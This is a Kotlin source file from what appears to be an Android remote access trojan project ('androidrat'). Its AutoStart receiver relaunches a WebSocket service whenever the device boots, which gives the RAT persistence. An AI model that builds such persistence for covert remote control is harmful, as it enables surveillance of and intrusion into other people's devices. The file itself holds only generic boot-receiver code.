package com.nqmgaming.androidrat.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.nqmgaming.androidrat.service.WebSocketService

class AutoStart : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (Intent.ACTION_BOOT_COMPLETED == intent.action) {
            Log.d("AutoStart", "Boot completed")
            val serviceIntent = Intent(context, WebSocketService::class.java)
            context.startService(serviceIntent)
        }
    }
}